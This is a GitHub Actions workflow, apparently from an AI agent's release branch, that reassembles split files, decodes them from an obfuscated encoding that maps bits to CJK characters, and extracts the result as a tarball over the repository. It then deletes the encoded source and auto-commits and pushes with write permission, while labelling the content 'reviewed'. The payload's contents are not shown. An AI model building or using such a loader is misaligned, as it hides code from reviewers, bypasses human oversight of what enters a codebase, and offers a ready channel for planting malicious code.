name: bootstrap-sentinel-2.2.1

on:
  pull_request:
    branches: [main]
    types: [synchronize]

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-24.04
    steps:
      - name: Check out feature branch
        uses: actions/checkout@v6
        with:
          ref: codex/sentinel-2.2.1-submission-release
          fetch-depth: 0

      - name: Rebuild reviewed submission overlay
        shell: bash
        run: |
          set -euo pipefail
          cat .bootstrap/u-* > /tmp/overlay.b32768
          python - <<'PY'
          from pathlib import Path

          text = Path("/tmp/overlay.b32768").read_text(encoding="utf-8")
          pad_text, payload = text.split(":", 1)
          pad = int(pad_text)
          bits = "".join(f"{ord(char) - 0x3400:015b}" for char in payload)
          if pad:
              bits = bits[:-pad]
          if len(bits) % 8:
              raise SystemExit("decoded bitstream is not byte-aligned")
          data = bytes(int(bits[index:index + 8], 2) for index in range(0, len(bits), 8))
          Path("/tmp/overlay.tar.gz").write_bytes(data)
          PY
          echo "4df3d4b97bf248958d07a4fb5de477fab05657b8428502fe05e8604f5e05f72d  /tmp/overlay.tar.gz" | sha256sum --check --strict
          tar -xzf /tmp/overlay.tar.gz
          rm -rf .bootstrap
          git diff --check

      - name: Commit submission release pack
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "release: add Sentinel 2.2.1 submission pack"
          git push origin HEAD:codex/sentinel-2.2.1-submission-release
